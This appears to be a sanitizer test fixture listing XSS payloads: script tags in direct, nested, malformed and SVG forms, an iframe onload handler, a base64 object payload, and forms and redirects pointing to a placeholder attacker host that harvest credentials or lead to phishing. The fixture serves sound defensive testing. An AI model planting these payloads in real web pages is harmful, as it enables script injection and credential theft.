# Adversarial Security Fixture: XSS & Script Injection

This fixture contains adversarial payloads targeting script execution, nested scripts, SVG scripts, and dangerous HTML tags per PRD Section 8.1 and Section 8.3.

## 1. Direct Script Tags

<script>
  window.__malicious_executed = true;
  window.__xss_payload_fired = 'direct_script';
</script>

<script type="text/javascript">
  window.__malicious_executed = true;
</script>

<script src="https://attacker.example.com/malicious.js"></script>

## 2. Nested and Malformed Script Tags

<scr<script>ipt>
  window.__malicious_executed = true;
</script>

<SCRIPT>
  window.__malicious_executed = true;
</SCRIPT>

<script/x>
  window.__malicious_executed = true;
</script>

## 3. Active SVG Script Injection

<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="green" />
  <script type="text/javascript">
    window.__malicious_executed = true;
    window.__svg_script_executed = true;
  </script>
</svg>

<svg>
  <script><![CDATA[
    window.__malicious_executed = true;
    window.__cdata_script = true;
  ]]></script>
  <text x="10" y="20">SVG text</text>
</svg>

## 4. Forbidden HTML Elements

<iframe src="https://example.com/untrusted" onload="window.__malicious_executed = true;"></iframe>

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="200" height="100"></object>

<embed src="https://example.com/payload.swf" width="200" height="100">

<form action="https://attacker.example.com/harvest" method="POST">
  <input type="text" name="username" value="victim" />
  <input type="password" name="password" value="secret" />
  <button type="submit">Submit Form</button>
</form>

<base href="https://attacker.example.com/" />

<meta http-equiv="refresh" content="0;url=https://attacker.example.com/phish" />

## 5. Safe Content Preservation

<div class="safe-container">
  <p>Safe surrounding text that <strong>must remain visible</strong> and uncorrupted after sanitization.</p>
</div>
